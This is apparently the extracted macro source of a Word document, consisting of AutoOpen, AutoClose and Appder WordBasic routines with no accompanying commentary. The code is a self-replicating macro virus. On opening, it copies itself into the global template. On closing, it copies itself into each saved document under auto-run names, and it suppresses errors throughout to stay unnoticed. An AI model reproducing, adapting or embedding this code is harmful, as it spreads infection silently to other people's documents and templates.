   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"


   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Quit
   WordBasic.CurValues.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Appder", sTMacro$
   sTMacro$ = sMe$ + ":Appder"
   WordBasic.MacroCopy "Global:Appder", sTMacro$
   sTMacro$ = sMe$ + ":AutoClose"
   WordBasic.MacroCopy "Global:AutoClose", sTMacro$
   WordBasic.FileSaveAs dlg
   GoTo Done
   Quit:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim AClose
   Dim Ad
   Dim sMe$
   Dim sMacro$
   On Error GoTo -1: On Error GoTo Quit
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0, 0) = "         " Then
           AClose = -1
       End If
       If WordBasic.[MacroName$](i, 0, 0) = "Appder" Then
           Ad = -1
       End If
   Next i
   If Not AClose And Not Ad Then
       sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":Appder"
       WordBasic.MacroCopy sMacro$, "Global:Appder"
       sMacro$ = sMe$ + ":AutoClose"
       WordBasic.MacroCopy sMacro$, "Global:AutoClose"
   End If
   Quit:
   End Sub

   Attribute VB_Name = "Appder"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim AClose
   Dim Ad
   Dim sMe$
   Dim sMacro$
   On Error GoTo -1: On Error GoTo Quit
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0, 0) = "         " Then
           AClose = -1
       End If
       If WordBasic.[MacroName$](i, 0, 0) = "Appder" Then
           Ad = -1
       End If
   Next i
   If Not AClose And Not Ad Then
       sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":Appder"
       WordBasic.MacroCopy sMacro$, "Global:Appder"
       sMacro$ = sMe$ + ":AutoClose"
       WordBasic.MacroCopy sMacro$, "Global:AutoClose"
   End If
   Quit:
   End Sub
